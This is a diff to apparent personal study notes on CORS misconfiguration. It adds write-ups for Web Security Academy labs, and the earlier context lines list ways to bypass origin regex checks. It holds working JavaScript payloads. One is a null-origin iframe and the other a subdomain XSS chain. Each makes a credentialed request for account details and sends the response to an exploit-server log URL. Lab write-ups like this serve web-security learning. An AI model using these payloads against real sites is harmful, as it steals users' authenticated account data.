@@ -38,6 +38,47 @@ Access-Control-Allow-Credentials: True
 - use suffix or prifix of allowd domain to check
 - try other ways to bypass regex
 
+# LAB
+### CORS Minconfiguration With No Protection
+```bash
+/accountDetail gives a json that contains account info
+tried Origin: example.com and it worked
+
+Now the javascript for exploit server
+```
+### CORS vulnerability with trusted null origin
+```bash
+Added null in input got the header as null
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```
+
+### Site trusts all subdomains
+```bash
+In that case find a reflected XSS
+We will request for resource using XSS then force the subdomain to send data to us
+
+in our server 
+
+<script>
+    document.location="https://stock.0a3b00eb035dfb9280751cc1000100e2.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a3b00eb035dfb9280751cc1000100e2.web-security-academy.net',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a93007e039dfb4c80861bcc01070025.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+
+Now what will happend is we will trigegr xss in subdomain and force it to send data back to us
+```
+
+```
+
 ### Resources
 - [Report 1](https://hackerone.com/reports/426165)
 - [Report 2](https://hackerone.com/reports/470298)
